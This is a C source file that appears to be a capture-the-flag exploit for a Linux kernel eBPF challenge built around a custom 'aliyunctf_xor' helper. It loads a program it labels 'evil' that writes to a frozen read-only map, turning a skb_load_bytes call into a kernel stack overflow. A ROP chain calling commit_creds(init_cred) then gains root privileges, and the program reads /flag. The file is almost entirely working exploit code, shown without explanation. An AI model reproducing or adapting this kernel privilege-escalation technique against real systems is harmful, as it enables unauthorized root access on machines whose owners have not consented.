//gcc load.c -o load -nostdlib -static

#include <linux/bpf.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include "bpf_insn.h"


int __attribute__((naked)) mysyscall(int cmd, ...)
{
    asm volatile(
	"movq %rdi, %rax\n"		/* Syscall number -> rax.  */
	"movq %rsi, %rdi\n"		/* shift arg1 - arg5.  */
	"movq %rdx, %rsi\n"
	"movq %rcx, %rdx\n"
	"movq %r8, %r10\n"
	"movq %r9, %r8\n"
	"movq 8(%rsp),%r9\n"	/* arg6 is on the stack.  */
	"syscall\n"			/* Do the system call.  */
	/* Jump to error handler if error.  */
	"ret\n"
    );

}
int myexit(int code)
{
    return mysyscall(__NR_exit, code);

}
int write(int fd, const char* buf, size_t size){

    return mysyscall(__NR_write, fd, buf, size);
}

int read(int fd, char* buf, size_t size){

    return mysyscall(__NR_read, fd, buf, size);
}

int socketpair (int __domain, int __type, int __protocol, int __fds[2])
{

    return mysyscall(__NR_socketpair, __domain, __type, __protocol, __fds);
}

int setsockopt (int __fd, int __level, int __optname, const void *__optval, int __optlen)
{

    return mysyscall(__NR_setsockopt, __fd, __level, __optname, __optval, __optlen);
}

void fatal(const char *msg) {
    write(3, msg, 100);
    myexit(1);
}

int bpf(int cmd, union bpf_attr *attrs) {
    return mysyscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}
int myopen(const char *filename, int mod)
{
    return mysyscall(__NR_open, filename, mod);
}


int mysendfile(int dst_fd, int src_fd, off_t *offset, size_t size)
{
    return mysyscall(__NR_sendfile, dst_fd, src_fd, offset, size);
}

#define BPF_FUNC_aliyunctf_xor 212
#define LOG_BUF_SZ (0x1000)



#define AF_UNIX 1
#define SOCK_DGRAM 2
#define SOL_SOCKET 1
#define SO_ATTACH_BPF 50

int main() {
    char log_buf[LOG_BUF_SZ];
    int array_map_fd;

    /* struct bpf_insn insns[] = { *\/ */
    /*     // you bytecode. */
    /* }; */

    {
        int key;
        size_t value;
        union bpf_attr attr = {};
        attr.map_type = BPF_MAP_TYPE_ARRAY;
        attr.key_size = 4;
        attr.value_size = 8;
        attr.max_entries = 1;
        attr.map_flags = BPF_F_RDONLY_PROG;

        array_map_fd =
            mysyscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    }

    // Place an elem
    {
        int key = 0;
        char value[8] = {};
        *(long long *)&value[0] = 1;
        union bpf_attr attr = {};
        attr.map_fd = array_map_fd;
        attr.key = (size_t)&key;
        attr.value = (size_t)&value;

        int ret =
            mysyscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
    }

      // Freeze map to make map "read-only"
    {
        union bpf_attr attr = {};
        attr.map_fd = array_map_fd;

        int ret = mysyscall(SYS_bpf, BPF_MAP_FREEZE, &attr, sizeof(attr));
    }

     // Setup evil bpf prog
    struct bpf_insn prog[] = {
        // ? R9 = CTX
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),
        // ? R3 = ELEM
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -16, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -16),
        BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(), // ? Remove or_null tag
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),

        // ? R6 = P1 (scalar)
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, 0),

        // ? R1(buf) = ptr to <value>, which will be set at read-only map
        BPF_ST_MEM(BPF_W, BPF_REG_10, -0x18, 2025 ^ (0x80)), // ! 256 bytes
        BPF_ST_MEM(BPF_W, BPF_REG_10, -0x14, 0),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -0x18),

        // ? R2(buf_size) = 8
        BPF_MOV64_IMM(BPF_REG_2, 8),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_aliyunctf_xor),

        // ? R1 = CTX
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),

        // ? R2 = anything
        BPF_MOV64_IMM(BPF_REG_2, 0),

        // ? R3 = stack
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),

        // ? R4 = size (previously as P1 (scalar), now changed to evil value)
        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),

        BPF_EXIT_INSN()
    };


      // Try load prog
    union bpf_attr prog_attr = {.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
                                .insn_cnt =
                                sizeof(prog) / sizeof(struct bpf_insn),
                                .insns = (uint64_t)prog,
                                .log_buf = (uint64_t)log_buf,
                                .log_size = LOG_BUF_SZ,
                                .log_level = 1 | 2,
                                .license = (uint64_t)"GPL"};

     int prog_fd =
      mysyscall(SYS_bpf, BPF_PROG_LOAD, &prog_attr, sizeof(prog_attr));

      // Prepare data for ROP chain
     char data_buf[4096] = {};
     struct __sk_buff md = {};

     size_t *rop_chain = (size_t *)&data_buf[30];
     *rop_chain++ = 0xffffffff8130d3de; //  pop rdi; ret;
     *rop_chain++ = 0xffffffff82a52fa0; //  &init_cred
     *rop_chain++ = 0xffffffff810c3c50; //  commit_creds
     *rop_chain++ = 0xffffffff8108e620; //  vfork

     // Run prog
     union bpf_attr test_run_attr = {
         .test.data_size_in = 1024,
         .test.data_in = (uint64_t)&data_buf,
         .test.ctx_size_in = sizeof(md),
         .test.ctx_in = (uint64_t)&md,
     };

     test_run_attr.prog_type = BPF_PROG_TEST_RUN;
     test_run_attr.test.prog_fd = prog_fd;
     int ret = mysyscall(SYS_bpf, BPF_PROG_TEST_RUN, &test_run_attr,
                              sizeof(test_run_attr));

     int fd = myopen("/flag", O_RDONLY);
     
     mysendfile(1, fd, 0, 0x100);

     while(1){}
     
    return 0;
}

void _start()
{
    myexit(main());
}
